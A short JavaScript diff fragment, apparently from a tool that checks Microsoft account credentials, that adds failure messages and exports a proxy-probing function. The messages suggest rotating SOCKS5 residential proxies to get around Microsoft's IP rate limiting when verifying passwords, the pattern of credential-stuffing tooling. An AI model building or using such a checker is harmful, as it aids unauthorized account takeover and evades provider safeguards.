+      'Account exists — password not verified (Microsoft still limited this IP). Try SOCKS5:\nsocks5://USER:PASS@proxy.soax.com:1337';
+    return { ok: false, summary: msg, error: msg, details };
+  }
+
+  const msg =
+    'Check failed. Proxy IP: ' +
+    (probe.ip || 'unknown') +
+    '. Mode: ' +
+    (probe.mode || _mode) +
+    '. Try socks5:// in MS_CHECK_PROXY or another SOAX port/package.';
+  return { ok: false, summary: msg, error: msg, details };
 }
 
-
-module.exports = { checkMicrosoft, MSG };
+module.exports = { checkMicrosoft, MSG, probeProxy };
